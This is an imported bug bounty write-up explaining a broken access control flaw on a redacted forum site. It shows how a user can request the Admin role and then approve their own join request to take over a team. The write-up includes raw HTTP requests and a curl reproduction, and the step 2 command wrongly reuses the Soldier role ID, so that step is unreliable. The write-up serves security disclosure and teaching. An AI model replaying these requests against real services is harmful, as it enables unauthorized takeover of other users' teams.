---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-01-09_full-team-takeover.md
original_filename: 2023-01-09_full-team-takeover.md
title: Full Team Takeover
category: documents
detected_topics:
- access-control
- xss
- command-injection
- otp
- cors
- clickjacking
tags:
- imported
- documents
- access-control
- xss
- command-injection
- otp
- cors
- clickjacking
language: en
raw_sha256: a710377514982408a8144945bef62651d7ae495437a0dede997ff9790c7a916e
text_sha256: de204a2bb003b68227225e6002ed8dadf66780def2bb466f55344b4ffc29e12e
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: true
---

# Full Team Takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-01-09_full-team-takeover.md
- Source Type: markdown
- Detected Topics: access-control, xss, command-injection, otp, cors, clickjacking
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: True
- Raw SHA256: `a710377514982408a8144945bef62651d7ae495437a0dede997ff9790c7a916e`
- Text SHA256: `de204a2bb003b68227225e6002ed8dadf66780def2bb466f55344b4ffc29e12e`


## Content

---
title: "Full Team Takeover"
url: "https://infosecwriteups.com/full-team-takeover-678c79842065"
authors: ["Tuhin Bose (@tuhin1729_)"]
bugs: ["Account takeover", "Broken Access Control"]
publication_date: "2023-01-09"
added_date: "2023-02-28"
source: "pentester.land/writeups.json"
original_index: 1684
scraped_via: "browseros"
---

# Full Team Takeover

Full Team Takeover
Tuhin Bose
Follow
4 min read
·
Jan 9, 2023

391

1

Hare Krishna! My name is Tuhin Bose (tuhin1729). I am currently working as a Security Engineer Intern at BugBase. In this write-up, I am going to share one of my findings which allowed me to takeover anyone’s team.
So without wasting time, let’s directly jump into the blog:

Introduction:

Basically, the target is a forum where people can interact with each other, create team with others etc. While analyzing the team functionality, I have noticed the following points:

Users can create a team.
Any other user can send request to join the team with any of these roles: soldier, manager & supporter. However, they can’t send request to join the team as an admin. Every role has a different importance level (an integer between 1 to 10) based on the permissions that they are allowed to perform in the team. For example, the role supporter has the importance level 10 (least privilege) & the role admin has the importance level 1 (most privilege).
If the admin of the team approves team joining request of any user, he/she will be a part of that team. However, only admin has the permission to allow anyone in their team.
First Issue - Sending Request to Join a Team as Admin:

While analyzing all the HTTP requests in burp suite, I noticed a request which is responsible for fetching all the available roles:

POST /functions/team-roles-get HTTP/2
Host: redacted.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: */*
Accept-Language: en-US,en;q=0.5
X-Session-Token: ***REDACTED-SUSPECT-TOKEN***Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
Content-Length: 2
Referer: https://redacted.com/
Origin: https://redacted.com

{}

I quicky captured the response & it looks like:

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 309
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, HEAD, OPTIONS, POST, PUT, DELETE
Access-Control-Allow-Origin: https://redacted.com
Date: Sun, 08 Jan 2023 05:18:59 GMT
Server: nginx
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Powered-By: Express
X-Xss-Protection: 1; mode=block

{"result":[{"roleName":"Soldier","importance":4,"objectId":"ZwskfB2xQr","__type":"Object","className":"TeamRole"},{"roleName":"Admin","importance":1,"objectId":"QgtliC3yRs","__type":"Object","className":"TeamRole"},{"roleName":"Manager","importance":2,"objectId":"RhvmjD4zSt","__type":"Object","className":"TeamRole"},{"roleName":"Supporter","importance":10,"objectId":"ViuokE5aTu","__type":"Object","className":"TeamRole"}]}

Basically, all the roles (including Admin), their importance & objectId are revealed in the response. However, through the UI, we can’t request to be an admin of the team.
Now, when I tried to send request to join the team as a Soldier, I noticed this HTTP request:

POST /functions/team-join-post HTTP/2
Host: redacted.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
Content-Length: 164
Referer: https://redacted.com/
X-Session-Token: ***REDACTED-SUSPECT-TOKEN***Origin: https://redacted.com

{"team":{"__type":"Pointer","className":"Team","objectId":"MdpcbB6bpz"},"role":{"__type":"Pointer","className":"TeamRole","objectId":"ZwskfB2xQr"},"message":"1234"}

“MdpcbB6bpz” is the objectId of the team & “ZwskfB2xQr” is the objectId of the role Soldier (refer to the response of /functions/team-roles-get). Now what if we change the objectId of Soldier to objectId of Admin in the above request? I expected some kind of error message but…

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 95
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, HEAD, OPTIONS, POST, PUT, DELETE
Access-Control-Allow-Origin: https://redacted.com
Date: Sun, 08 Jan 2023 06:37:56 GMT
Server: nginx
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Powered-By: Express
X-Xss-Protection: 1; mode=block

{"result":{"awaitingApproval":true,"message":"1234","objectId":"GfqdcC7cqA","__type":"Object","className":"TeamMember"}}

Request submitted successfully :) “GfqdcC7cqA” is the objectId of the team joining request.

Get Tuhin Bose’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Second Issue - Approving Team Joining Request on Behalf of Admin:

Now even if we send our team joining request to be an admin of the team, the real admin won’t allow our request as he/she can clearly see the role which we applied for.
When I logged in to the admin account & tried to approve a team joining request, I noticed the following HTTP request:

POST /functions/team-join-response-post HTTP/2
Host: redacted.com
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Type: application/json; charset=utf-8
Accept: */*
X-Session-Token: ***REDACTED-SUSPECT-TOKEN***Origin: https://redacted.com
Referer: https://redacted.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{"team":{"__type":"Pointer","className":"Team","objectId":"MdpcbB6bpz"},"member":{"__type":"Pointer","className":"TeamMember","objectId":"GfqdcC7cqA"},"isApproved":true}

“MdpcbB6bpz” is the objectId of the team & “GfqdcC7cqA” is the objectId of the team joining request (we have seen this earlier). Now what if I send this same HTTP request from any other user’s account? I quickly logged in to the first account (from where I sent this team joining request) & fired the above request.

Press enter or click to view image in full size

B00M! I joined the team as an admin. Now I can edit the team details, view & approve/deny all the other team joining requests.

In case, you’re too lazy to read the above stuffs, here is a shorter version:

Steps to Reproduce:
Get objectId of the role Admin:
tuhin1729@kali:~$ curl -XPOST https://redacted.com/functions/team-roles-get --data '{}' -H 'X-Session-Token: 5X3y9K8o5M0x3N1c7F6v3P8o3D2n0Q2b5J9v9B8g'

{"result":[{"roleName":"Soldier","importance":4,"objectId":"ZwskfB2xQr","__type":"Object","className":"TeamRole"},{"roleName":"Admin","importance":1,"objectId":"QgtliC3yRs","__type":"Object","className":"TeamRole"},{"roleName":"Manager","importance":2,"objectId":"RhvmjD4zSt","__type":"Object","className":"TeamRole"},{"roleName":"Supporter","importance":10,"objectId":"ViuokE5aTu","__type":"Object","className":"TeamRole"}]}

2. Send a request to join the team as an Admin:

tuhin1729@kali:~$ curl -XPOST https://redacted.com/functions/team-join-post --data '{"team":{"__type":"Pointer","className":"Team","objectId":"MdpcbB6bpz"},"role":{"__type":"Pointer","className":"TeamRole","objectId":"ZwskfB2xQr"},"message":"1234"}' -H 'X-Session-Token: 5X3y9K8o5M0x3N1c7F6v3P8o3D2n0Q2b5J9v9B8g'

{"result":{"awaitingApproval":true,"message":"1234","objectId":"GfqdcC7cqA","__type":"Object","className":"TeamMember"}}

3. Copy the objectId & approve the team joining request:

tuhin1729@kali:~$ curl -XPOST https://redacted.com/functions/team-join-response-post --data '{"team":{"__type":"Pointer","className":"Team","objectId":"MdpcbB6bpz"},"member":{"__type":"Pointer","className":"TeamMember","objectId":"GfqdcC7cqA"},"isApproved":true}' -H 'X-Session-Token: 5X3y9K8o5M0x3N1c7F6v3P8o3D2n0Q2b5J9v9B8g'

{"result":true}

Observe that, you’re now an admin of the team.

Hope you liked this blog. Let me know if you have any further query.
Follow me on twitter: @tuhin1729_
